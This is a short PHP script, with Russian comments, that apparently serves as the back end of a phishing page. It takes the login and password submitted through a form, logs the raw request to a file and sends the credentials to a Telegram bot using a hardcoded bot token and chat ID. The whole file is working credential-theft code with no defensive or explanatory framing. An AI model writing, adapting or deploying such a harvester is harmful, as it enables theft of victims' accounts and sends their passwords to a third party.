<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
// Логирование для отладки
file_put_contents('debug.log', file_get_contents('php://input'));

$token = "5883841382:AAFhLQCO6YbHrtupqS2i6oCRMJHLIXWHgWQ";
$chat_id = "719162899";

// Получение данных из обычного POST
$login = isset($_POST['login']) ? $_POST['login'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

$message = "Новые данные:\nЛогин: $login\nПароль: $password";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));

http_response_code(200);
echo json_encode(['status' => 'ok']);
?>
